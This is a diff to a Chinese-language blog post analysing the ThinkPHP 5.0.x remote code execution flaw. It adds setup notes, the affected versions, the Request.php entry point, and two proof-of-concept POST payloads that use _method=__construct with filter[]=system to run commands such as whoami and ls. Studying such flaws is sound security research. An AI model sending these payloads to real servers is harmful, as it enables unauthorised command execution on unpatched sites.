@@ -65,7 +65,7 @@
         <div class="row">
             <div class="col-lg-8 col-md-10 mx-auto">
                 <div class="post-heading">
-                    <h1>ThinkPHP 5.0.x RCE漏洞分析</h1>
+                    <h1>ThinkPHP 5.0.x RCE漏洞</h1>
                     <h2 class="subheading">Include POP and EXP</h2>
                     <span class="meta">Posted by
               <a href="#">SEVENTEEN</a>
@@ -84,36 +84,66 @@
 
                 <h2 class="section-heading">前言</h2>
 
-                <p>&nbsp;&nbsp;&nbsp;最近反序列化漏洞分析了几个，准备来换个口味，来分析一下ThinkPHP5.x RCE漏洞。</p>
+                <p>&nbsp;&nbsp;&nbsp;最近反序列化漏洞分析了几个，准备来换个口味，
+                	来分析一下我觉得难度不小的ThinkPHP5.x RCE漏洞。</p>
 
                 <h2 class="section-heading">配置环境</h2>
 
-                <p>&nbsp;&nbsp;&nbsp;</p>
+                <p>&nbsp;&nbsp;&nbsp;在TP官网下载5.022核心版。</p>
 
                 <a href="#">
                     <img class="img-fluid" src="../img/2021-5-20/install.jpg" alt="">
-                </a>
-
-
-                <p>&nbsp;&nbsp;&nbsp;</p>
-
-                <a href="#">
-                    <img class="img-fluid" src="../img/2021-5-20/config.jpg" alt="">
-                </a>
-                
-                <p>&nbsp;&nbsp;&nbsp;</p>
-
-                <a href="#">
-                    <img class="img-fluid" src="../img/2021-5-20/start.jpg" alt="">
                 </a>
                 
                 <h2 class="section-heading">利用条件</h2>
 
                 <p>&nbsp;&nbsp;&nbsp;5.x <= 5.0.23</p>
                 
-                <h2 class="section-heading">利用链</h2>
+								
+								<h2 class="section-heading">利用链如下</h2>
 
-                <h2 class="section-heading">POC</h2>
+								<p>&nbsp;&nbsp;&nbsp;该利用链不短，debug涉及的点也比较多，从入口点开始分析。
+									搜索一下call_user_func函数触发点。
+									
+								<a href="#">
+                    <img class="img-fluid" src="../img/2021-5-20/pop-1.jpg" alt="">
+                </a>
+									
+									
+								<p>&nbsp;&nbsp;&nbsp;入口点位于:/thinkphp/library/think/Request.php，
+									需要控制$filter与$value的值，才能命令执行。</p>
+									
+								<a href="#">
+                    <img class="img-fluid" src="../img/2021-5-20/pop-2.jpg" alt="">
+                </a>
+
+	
+
+
+
+
+
+                <h2 class="section-heading">POC(调试模式开启)</h2>
+                
+                <div>
+                	
+                	<pre class='hljs'><code>POST: <span class="hljs-title">_method</span>=__construct&amp;<span class="hljs-built_in">filter</span>[]=<span class="hljs-keyword">system</span>&amp;<span class="hljs-built_in">get</span>[]=whoami
+或者
+POST: <span class="hljs-title">_method</span>=__construct&amp;<span class="hljs-built_in">filter</span>[]=<span class="hljs-keyword">system</span>&amp;route[]=whoami</code></pre>
+                	
+                </div>
+                
+                
+                
+                
+                <h2 class="section-heading">POC(调试模式未开启)</h2>
+                
+                <div>
+                	
+                	<pre class='hljs'><code><span class="hljs-type">GET</span>: s=captcha
+<span class="hljs-type">POST</span>: _method=__construct&amp;<span class="hljs-keyword">method</span>=get&amp;filter[]=system&amp;get[]=ls</code></pre>
+                	
+                </div>
                 
 
                 <h2 class="section-heading">There Is Nothing Below</h2>
